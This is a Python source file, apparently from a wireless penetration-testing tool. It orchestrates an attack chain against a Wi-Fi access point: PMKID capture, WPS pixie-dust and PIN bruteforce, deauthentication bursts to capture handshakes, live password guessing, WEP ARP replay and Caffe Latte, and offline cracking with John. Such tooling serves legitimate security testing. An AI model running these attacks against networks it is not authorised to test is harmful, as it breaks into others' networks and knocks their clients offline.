"""OMNI adaptive attack chain orchestrator.

Given a locked target AccessPoint, tries stages in order and stops at
the first one that yields crackable material, then cracks it.

Chain: PROFILE -> PMKID -> WPS -> HANDSHAKE -> ONLINE -> CRACK -> DONE.
ONLINE is a live per-password 4-way-handshake attempt
against the AP itself (attacks/online.py) -- WPA/WPA2/transition
(PSK AKM) only, skipped for WPA3-only/SAE targets, and only run once
a wordlist is configured (nothing to guess otherwise). WEP targets
skip this whole WPA-oriented chain entirely: PROFILE -> WEP -> DONE,
where WEP tries AP-directed ARP replay then falls back to Caffe Latte
against a visible client (see _stage_wep).

Single-adapter by design. Dual-Alfa split listen/attack (PINCER) is a
separate, real, tested implementation (gui/attack_runner.py's pincer()),
not part of this orchestrator's own chain.

Every stage body that touches the network is dependency-injected
(pmkid_fn/handshake_fn/deauth_fn/cracker) so orchestration logic can be
unit-tested without hardware.
"""

from __future__ import annotations

import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path

from .attacks.deauth import deauth as _default_deauth
from .attacks.handshake import HandshakeCapture, HandshakeStatus
from .attacks.handshake import capture_handshake as _default_capture_handshake
from .attacks.logic import best_status, run_deauth_flow, select_client
from .attacks.online import online_guess as _default_online_guess
from .attacks.pmkid import capture_pmkid as _default_capture_pmkid
from .attacks.wep_client import caffe_latte as _default_caffe_latte
from .attacks.wep_crack import crack_wep as _default_crack_wep
from .attacks.wps import pixie_attempt as _default_pixie_attempt
from .attacks.wps import wps_pin_bruteforce as _default_wps_bruteforce
from .crack.base import Cracker
from .crack.convert import cap_to_22000
from .radio import get_mac
from .scan import AccessPoint


class StageResult(Enum):
    """Outcome of one OMNI stage."""

    SUCCESS = "success"
    SKIPPED = "skipped"
    FAILED = "failed"


@dataclass
class StageReport:
    """One stage's outcome and a short human-readable reason."""

    name: str
    result: StageResult
    detail: str = ""


@dataclass
class OmniReport:
    """Full per-target run: stage-by-stage trail plus any crack results."""

    target: str
    stages: list[StageReport] = field(default_factory=list)
    hash_lines: list[str] = field(default_factory=list)
    cracked: dict[str, str] = field(default_factory=dict)

    def summary(self) -> str:
        """Render a per-stage report."""
        lines = [f"OMNI report for {self.target}"]
        for s in self.stages:
            detail = f": {s.detail}" if s.detail else ""
            lines.append(f"  [{s.result.value:7}] {s.name}{detail}")
        if self.cracked:
            lines.append(f"  CRACKED: {self.cracked}")
        return "\n".join(lines)


class OmniOrchestrator:
    """Adaptive per-target attack chain with first-success short-circuit."""

    HANDSHAKE_MAX_ROUNDS = 6
    HANDSHAKE_ROUND_INTERVAL = 15.0
    HANDSHAKE_BURST_SIZE = 4  # frames/round -- see attacks/logic.py's DEFAULT_BURST_SIZE

    def __init__(
        self,
        iface: str,
        cracker: Cracker | None = None,
        capture_dir: str | Path = ".",
        pmkid_fn=_default_capture_pmkid,
        handshake_fn=_default_capture_handshake,
        deauth_fn=_default_deauth,
        wps_fn=_default_wps_bruteforce,
        pixie_fn=_default_pixie_attempt,
        online_fn=_default_online_guess,
        crack_wep_fn=_default_crack_wep,
        caffe_latte_fn=_default_caffe_latte,
        stop_event: threading.Event | None = None,
        handshake_max_rounds: int | None = None,
        handshake_round_interval: float | None = None,
        handshake_burst_size: int | None = None,
        listener_settle: float = 2.0,
        online_max_attempts: int | None = 100,
        wep_key_len: int = 13,
        progress_fn=None,
        proc_holder: dict | None = None,
    ):
        self.iface = iface
        self.cracker = cracker
        self.capture_dir = Path(capture_dir)
        # Shared with the caller's own Stop button (e.g. App._crack_proc_holder)
        # so a live john/aircrack-ng subprocess launched by _stage_crack can
        # actually be terminated from outside -- without this, Stop Attack
        # had no handle on the crack stage's process at all and a running
        # crack (which can take many minutes against a real wordlist) simply
        # ignored it completely (confirmed live 2026-08-27: John kept running
        # 320+s after multiple Stop Attack clicks, each of which only ever
        # re-logged "stop requested" with nothing behind it for this stage).
        self._proc_holder = proc_holder if proc_holder is not None else {}
        self._pmkid_fn = pmkid_fn
        self._handshake_fn = handshake_fn
        self._deauth_fn = deauth_fn
        self._wps_fn = wps_fn
        self._pixie_fn = pixie_fn
        self._online_fn = online_fn
        self._crack_wep_fn = crack_wep_fn
        self._caffe_latte_fn = caffe_latte_fn
        self.wep_key_len = wep_key_len
        self._stop = stop_event or threading.Event()
        self.handshake_max_rounds = self.HANDSHAKE_MAX_ROUNDS if handshake_max_rounds is None else handshake_max_rounds
        self.handshake_round_interval = self.HANDSHAKE_ROUND_INTERVAL if handshake_round_interval is None else handshake_round_interval
        self.handshake_burst_size = self.HANDSHAKE_BURST_SIZE if handshake_burst_size is None else handshake_burst_size
        self._listener_settle = listener_settle
        # "Budgeted" per the module docstring/roadmap -- online guessing is
        # a slow, noisy last resort (one live association + 4-way handshake
        # per candidate), not a wordlist-exhausting brute force. None means
        # no cap (caller's explicit choice, not the default).
        self.online_max_attempts = online_max_attempts
        # Previously nothing logged stage-by-stage — the caller only saw
        # report.summary() after the *entire* chain finished, which on a
        # multi-minute run (PMKID + WPS pixie/bruteforce + handshake rounds)
        # looked identical to "nothing is happening".
        self._log = progress_fn or (lambda msg: None)

    def stop(self) -> None:
        """Signal any in-progress stage loop (e.g. handshake rounds) to abort."""
        self._stop.set()

    def run(self, ap: AccessPoint, wordlist: str | None = None) -> OmniReport:
        """Run the adaptive chain against ap; return the full report."""
        self._log(f"OMNI: starting chain against {ap.bssid} ({ap.ssid or '<hidden>'})")
        report = OmniReport(target=ap.bssid)
        self._stage_profile(ap, report)

        if ap.security == "open":
            self._log("open network — nothing to crack, stopping here")
            report.stages.append(
                StageReport("pmkid", StageResult.SKIPPED, "open network — nothing to crack")
            )
            return report

        if ap.security == "WEP":
            self._log("stage: WEP")
            self._stage_wep(ap, report)
            return report

        self._log("stage: PMKID")
        if self._stage_pmkid(ap, report):
            self._log("PMKID succeeded — skipping straight to crack")
            self._stage_crack(report, wordlist)
            return report

        self._log("stage: WPS")
        if self._stage_wps(ap, report):
            self._log("WPS succeeded — key obtained directly, no crack stage needed")
            return report  # WPS success already populated report.cracked directly

        self._log("stage: HANDSHAKE")
        hs_status = self._stage_handshake(ap, report)

        self._log("stage: ONLINE")
        # CHALLENGE material is crackable too now (see _stage_handshake), so
        # it counts as "material captured" for skipping the online stage
        # the same way AUTHORIZED does -- only a bare NONE leaves nothing to
        # crack offline and still needs the online fallback.
        self._stage_online(ap, report, material_captured=hs_status is not HandshakeStatus.NONE, wordlist=wordlist)

        self._log("stage: CRACK")
        self._stage_crack(report, wordlist)
        return report

    def run_smart(self, ap: AccessPoint, wordlist: str | None = None) -> OmniReport:
        """Quick attack: PMKID first, deauth only if PMF allows it, no
        WPS/ONLINE.

        A faster single-target subset of run() -- kept as its own entry
        point (not folded into run()) to preserve two distinct modes:
        full adaptive OMNI chain vs. a quick PMF-aware PMKID-then-deauth
        pass. Reuses run()'s own stage methods, so there's no duplicated
        attack logic between the two.
        """
        self._log(f"Smart: starting quick attack against {ap.bssid} ({ap.ssid or '<hidden>'})")
        report = OmniReport(target=ap.bssid)
        self._stage_profile(ap, report)

        if ap.security == "open":
            self._log("open network — nothing to crack, stopping here")
            report.stages.append(
                StageReport("pmkid", StageResult.SKIPPED, "open network — nothing to crack")
            )
            return report

        if ap.security == "WEP":
            self._log("stage: WEP")
            self._stage_wep(ap, report)
            return report

        self._log("stage: PMKID")
        if self._stage_pmkid(ap, report):
            self._log("PMKID succeeded — skipping straight to crack")
            self._stage_crack(report, wordlist)
            return report

        if ap.pmf == "required":
            from .secure import recommend_attack

            pivot = recommend_attack(ap)
            self._log(f"PMF required — deauth would be dropped, skipping handshake stage ({pivot['reason']})")
            report.stages.append(StageReport("handshake", StageResult.SKIPPED, pivot["reason"]))
            return report

        self._log("stage: HANDSHAKE")
        self._stage_handshake(ap, report)
        self._log("stage: CRACK")
        self._stage_crack(report, wordlist)
        return report

    # -- stages -----------------------------------------------------------

    def _stage_profile(self, ap: AccessPoint, report: OmniReport) -> None:
        detail = f"security={ap.security} pmf={ap.pmf}"
        report.stages.append(StageReport("profile", StageResult.SUCCESS, detail))

    def _stage_pmkid(self, ap: AccessPoint, report: OmniReport) -> bool:
        """Clientless PMKID attempt; True and records a hash line on success."""
        try:
            attacker_mac = get_mac(self.iface)
        except Exception as exc:  # noqa: BLE001 - radio lookup failure shouldn't crash the chain
            report.stages.append(StageReport("pmkid", StageResult.FAILED, str(exc)))
            return False

        for attempt in range(2):
            if self._stop.is_set():
                report.stages.append(StageReport("pmkid", StageResult.SKIPPED, "stopped"))
                return False
            self._log(f"PMKID attempt {attempt + 1}/2 against {ap.bssid}")
            line = self._pmkid_fn(
                self.iface, bssid=ap.bssid, client=attacker_mac, channel=ap.channel,
                essid=ap.ssid, timeout=12.0,
                stop_event=self._stop, progress_fn=self._log,
            )
            if line:
                report.hash_lines.append(line)
                report.stages.append(
                    StageReport("pmkid", StageResult.SUCCESS, f"attempt {attempt + 1}")
                )
                return True
        report.stages.append(StageReport("pmkid", StageResult.FAILED, "no PMKID in 2 attempts"))
        return False

    def _stage_wps(self, ap: AccessPoint, report: OmniReport) -> bool:
        """WPS attack chain: pixie-dust offline first, then split-half PIN bruteforce.

        Pixie-dust requires only one live M1→M3 exchange before going offline;
        if it finds the PIN it verifies via a second M1→M7 cycle. Falls through
        to bruteforce (11,000-attempt split-half sweep) on failure.

        AP Setup Locked (from M1) skips outright; a run of consecutive
        timeouts is treated as suspected rate-limiting/lockout and aborts
        early rather than exhausting the full attempt budget.
        """
        if ap.wps is None:
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "scan profile has no WPS IE"))
            return False
        if ap.wps == "locked":
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "AP Setup Locked in scan profile"))
            return False

        from .attacks.wps import AttemptOutcome

        if self._stop.is_set():
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "stopped"))
            return False

        # Pixie-dust: one M1→M3 exchange + offline crack + optional M1→M7 verify
        self._log("WPS: trying pixie-dust first (one live exchange, then offline crack)")
        pd_result = self._pixie_fn(
            self.iface, ap.bssid, ap.ssid or "", channel=ap.channel, progress_fn=self._log, stop_event=self._stop,
        )
        if pd_result.outcome is AttemptOutcome.AP_SETUP_LOCKED:
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "AP Setup Locked"))
            return False
        if pd_result.outcome is AttemptOutcome.SUCCESS:
            report.cracked[ap.bssid] = pd_result.network_key or ""
            report.stages.append(StageReport("wps", StageResult.SUCCESS, "pixie-dust"))
            return True

        # Fall through to online bruteforce
        if self._stop.is_set():
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "stopped"))
            return False
        self._log(f"WPS: pixie-dust failed ({pd_result.outcome.value}) — falling back to PIN bruteforce")
        result = self._wps_fn(
            self.iface, ap.bssid, ap.ssid or "", channel=ap.channel, stop_event=self._stop, progress_fn=self._log,
        )
        if result.ap_setup_locked:
            report.stages.append(StageReport("wps", StageResult.SKIPPED, "AP Setup Locked"))
            return False
        if result.aborted_lockout:
            report.stages.append(
                StageReport("wps", StageResult.FAILED, f"suspected lockout after {result.attempts} attempts")
            )
            return False
        if result.success:
            report.cracked[ap.bssid] = result.network_key or ""
            report.stages.append(
                StageReport("wps", StageResult.SUCCESS, f"PIN {result.pin} -> SSID={result.ssid!r}")
            )
            return True
        report.stages.append(StageReport("wps", StageResult.FAILED, f"exhausted after {result.attempts} attempts"))
        return False

    def _stage_wep(self, ap: AccessPoint, report: OmniReport) -> bool:
        """WEP recovery: AP-directed ARP replay first (crack_wep -- fake-auth
        to the AP, wait for/replay an ARP seed). If the AP never produces a
        seed frame at all but a client is visible in the scan, that client
        is transmitting its own WEP traffic directly -- Caffe Latte
        (wep_client.caffe_latte) replays a captured client ARP back at the
        CLIENT instead, needing no AP association, so it can still recover
        the key when the AP side stays silent. Skipped (not retried via
        Caffe Latte) when a seed WAS found but there weren't enough
        sessions to crack -- that's a "keep waiting longer" problem, not
        one Caffe Latte's different capture path would fix."""
        if self._stop.is_set():
            report.stages.append(StageReport("wep", StageResult.SKIPPED, "stopped"))
            return False

        try:
            client = get_mac(self.iface)
        except Exception as exc:  # noqa: BLE001 - radio lookup failure shouldn't crash the chain
            report.stages.append(StageReport("wep", StageResult.FAILED, str(exc)))
            return False

        self._log(f"WEP: ARP replay against {ap.bssid}")
        result_out: dict = {}
        key = self._crack_wep_fn(
            self.iface, ap.bssid, client, ap.ssid or "", key_len=self.wep_key_len,
            channel=ap.channel, stop_event=self._stop, progress_fn=self._log, result_out=result_out,
        )
        if key is not None:
            report.cracked[ap.bssid] = key.hex()
            report.stages.append(StageReport("wep", StageResult.SUCCESS, f"ARP replay -> key={key.hex()}"))
            return True

        if result_out.get("seed_found"):
            report.stages.append(StageReport("wep", StageResult.FAILED, "ARP seed found but not enough sessions to recover the key"))
            return False

        if not ap.clients:
            report.stages.append(
                StageReport("wep", StageResult.FAILED, "no ARP seed via AP replay, and no client seen to try Caffe Latte against")
            )
            return False

        if self._stop.is_set():
            report.stages.append(StageReport("wep", StageResult.SKIPPED, "stopped before Caffe Latte"))
            return False

        target_client = next(iter(ap.clients))
        self._log(f"WEP: no ARP seed via AP replay, client {target_client} visible — trying Caffe Latte")
        key = self._caffe_latte_fn(
            self.iface, target_client, key_len=self.wep_key_len,
            channel=ap.channel, stop_event=self._stop, progress_fn=self._log,
        )
        if key is not None:
            report.cracked[ap.bssid] = key.hex()
            report.stages.append(
                StageReport("wep", StageResult.SUCCESS, f"Caffe Latte vs {target_client} -> key={key.hex()}")
            )
            return True

        report.stages.append(StageReport("wep", StageResult.FAILED, "Caffe Latte found no key"))
        return False

    def _stage_handshake(self, ap: AccessPoint, report: OmniReport) -> HandshakeStatus:
        """Deauth rounds (small bursts, paced, stopping the moment ANY
        crackable material appears) with a capture gate.

        Client targeting and round pacing live in attacks/logic.py
        (select_client / run_deauth_flow) rather than inline here: the
        strongest-signal known client is targeted, in bursts well below
        deauth()'s 64-frame default, and the loop exits as soon as the
        live HandshakeCapture holds CHALLENGE or AUTHORIZED material
        instead of always running the full round budget.

        Skipped outright when PMF is required (802.11w drops the deauths,
        so there's no point attempting the stage at all).
        """
        if ap.pmf == "required":
            report.stages.append(
                StageReport("handshake", StageResult.SKIPPED, "PMF required — deauth would be dropped")
            )
            return HandshakeStatus.NONE

        outfile = str(self.capture_dir / f"{ap.bssid.replace(':', '')}.pcap")
        # Created up front and handed into the sniffer so run_deauth_flow can
        # poll it live, round to round -- handshake_fn only RETURNS its own
        # HandshakeCapture once the whole listen window ends, which is too
        # late to skip rounds after material has already shown up.
        live_cap = HandshakeCapture()
        result: dict[str, HandshakeCapture] = {}
        total_window = self.handshake_max_rounds * self.handshake_round_interval + 10.0

        def run_capture() -> None:
            result["cap"] = self._handshake_fn(
                self.iface, ap.bssid, channel=ap.channel, timeout=total_window, outfile=outfile,
                stop_event=self._stop, progress_fn=self._log, cap=live_cap,
            )

        listener = threading.Thread(target=run_capture)
        listener.start()
        time.sleep(self._listener_settle)  # let the sniffer settle before the first burst

        client = select_client(ap)
        run_deauth_flow(
            self._deauth_fn, self.iface, ap, client, live_cap,
            max_rounds=self.handshake_max_rounds,
            round_interval=self.handshake_round_interval,
            burst_size=self.handshake_burst_size,
            min_status=HandshakeStatus.CHALLENGE,
            stop_event=self._stop,
            progress_fn=self._log,
        )

        # Join on the FULL listen window, not just the deauth round budget --
        # the listener may still be running and hasn't written result["cap"]
        # yet. Joining short silently discarded real material. History.md,
        # 2026-09-12.
        listener.join(timeout=total_window + 15.0)
        # Prefer the thread's actual return value (what the existing tests'
        # handshake_fn fakes provide), but fall back to live_cap -- the same
        # object for the real capture_handshake() -- if join() still somehow
        # timed out without result["cap"] ever being set, rather than
        # discarding material we know is already sitting there.
        cap = result.get("cap")
        if cap is None:
            cap = live_cap
        if cap is None or not cap.messages:
            report.stages.append(StageReport("handshake", StageResult.FAILED, "no EAPOL captured"))
            return HandshakeStatus.NONE

        best = best_status(cap)

        if best is HandshakeStatus.AUTHORIZED:
            report.stages.append(StageReport("handshake", StageResult.SUCCESS, f"captured {outfile}"))
            report.hash_lines.append(outfile)  # resolved to 22000 lines in _stage_crack
        elif best is HandshakeStatus.CHALLENGE:
            # M1+M2 alone is real, standard WPA handshake material -- offline
            # cracking (hashcat/John mode 22000) never needs M3 at all, only
            # the AP's own real-time confirmation does. Previously this was
            # treated as "not crackable-confirmed" and never even reached
            # _stage_crack, silently discarding genuinely usable hashes.
            # Live-verified 2026-08-27: hcxpcapngtool wrote a real crackable
            # 22000 line from a CHALLENGE-only pair sitting right next to an
            # AUTHORIZED one in the same capture. Still worth flagging as
            # unverified-by-the-AP in the report, but it goes to the crack
            # stage the same as AUTHORIZED.
            report.stages.append(
                StageReport(
                    "handshake", StageResult.SUCCESS,
                    f"captured {outfile} (CHALLENGE only — M1+M2, unverified by the AP, but crackable)",
                )
            )
            report.hash_lines.append(outfile)
        else:
            report.stages.append(StageReport("handshake", StageResult.FAILED, "no EAPOL captured"))
        return best

    def _stage_online(
        self, ap: AccessPoint, report: OmniReport, material_captured: bool, wordlist: str | None,
    ) -> None:
        """Live 4-way-handshake password guessing against the AP itself
        (attacks/online.py) -- the AP validates each candidate for us, no
        offline crack needed if it succeeds. Skipped once capture material
        already exists (nothing left to gain), with no wordlist configured
        (nothing to guess), or against a non-PSK target (WPA3/SAE-only,
        WEP -- online.py's crypto only models WPA/WPA2-Personal PSK)."""
        if material_captured:
            report.stages.append(
                StageReport("online", StageResult.SKIPPED, "capture material already obtained")
            )
            return
        if wordlist is None:
            report.stages.append(
                StageReport("online", StageResult.SKIPPED, "no wordlist configured")
            )
            return
        if ap.security not in ("WPA", "WPA2", "transition"):
            report.stages.append(
                StageReport(
                    "online", StageResult.SKIPPED,
                    f"security={ap.security} has no PSK to guess online (WPA3/SAE-only and WEP unsupported)",
                )
            )
            return
        if ap.pairwise_cipher == "TKIP":
            report.stages.append(StageReport("online", StageResult.SKIPPED, "TKIP is unsupported; online guessing requires CCMP/AES"))
            return
        if self._stop.is_set():
            report.stages.append(StageReport("online", StageResult.SKIPPED, "stopped"))
            return

        try:
            client = get_mac(self.iface)
        except Exception as exc:  # noqa: BLE001 - radio lookup failure shouldn't crash the chain
            report.stages.append(StageReport("online", StageResult.FAILED, str(exc)))
            return

        self._log(f"online: live password guessing against {ap.bssid} using {wordlist}")
        result = self._online_fn(
            self.iface, ap.bssid, ap.ssid or "", client, wordlist,
            channel=ap.channel, pairwise_cipher=ap.pairwise_cipher,
            max_attempts=self.online_max_attempts,
            stop_event=self._stop, progress_fn=self._log,
        )
        if result.success:
            report.cracked[ap.bssid] = result.password or ""
            report.stages.append(
                StageReport("online", StageResult.SUCCESS, f"password={result.password!r} after {result.attempts} attempt(s)")
            )
        else:
            report.stages.append(
                StageReport("online", StageResult.FAILED, f"{result.detail} ({result.attempts} attempt(s))")
            )

    def _stage_crack(self, report: OmniReport, wordlist: str | None) -> None:
        """Batch dedupe collected material into one file and run the cracker."""
        lines: list[str] = []
        for item in report.hash_lines:
            if item.endswith(".pcap"):
                out22000 = item + ".22000"
                try:
                    cap_to_22000(item, out22000)
                except Exception as exc:  # noqa: BLE001 - converter can raise several error types; stage must not crash
                    report.stages.append(StageReport("crack", StageResult.FAILED, str(exc)))
                    return
                lines.extend(Path(out22000).read_text().splitlines())
            else:
                lines.append(item)

        deduped = sorted({l for l in lines if l.strip()})
        if not deduped:
            self._log("crack: no hash material collected from any stage")
            report.stages.append(StageReport("crack", StageResult.SKIPPED, "no hash material"))
            return

        batch_path = self.capture_dir / f"{report.target.replace(':', '')}_{int(time.time())}.22000"
        batch_path.write_text("\n".join(deduped) + "\n")
        self._log(f"crack: {len(deduped)} hash line(s) batched to {batch_path}")

        if self.cracker is None or wordlist is None:
            report.stages.append(
                StageReport("crack", StageResult.SKIPPED, f"material batched at {batch_path}, no cracker/wordlist given")
            )
            return

        self._log(f"crack: running John against {wordlist}")
        run_streaming = getattr(self.cracker, "run_streaming", None)
        try:
            if run_streaming is not None:
                # Streaming (Popen + proc_holder), not the plain blocking
                # crack() -- this is what actually makes Stop Attack able to
                # kill a long-running crack, same mechanism the Captures
                # tab's own crack dialog already used.
                self._proc_holder.clear()
                results = run_streaming(str(batch_path), wordlist, self._log, self._proc_holder)
            else:
                results = self.cracker.crack(str(batch_path), wordlist)
        except Exception as exc:  # noqa: BLE001 - cracker backend errors must not crash the chain
            report.stages.append(StageReport("crack", StageResult.FAILED, str(exc)))
            return
        report.cracked.update(results)
        if results:
            report.stages.append(StageReport("crack", StageResult.SUCCESS, str(results)))
        else:
            report.stages.append(StageReport("crack", StageResult.FAILED, "wordlist exhausted"))
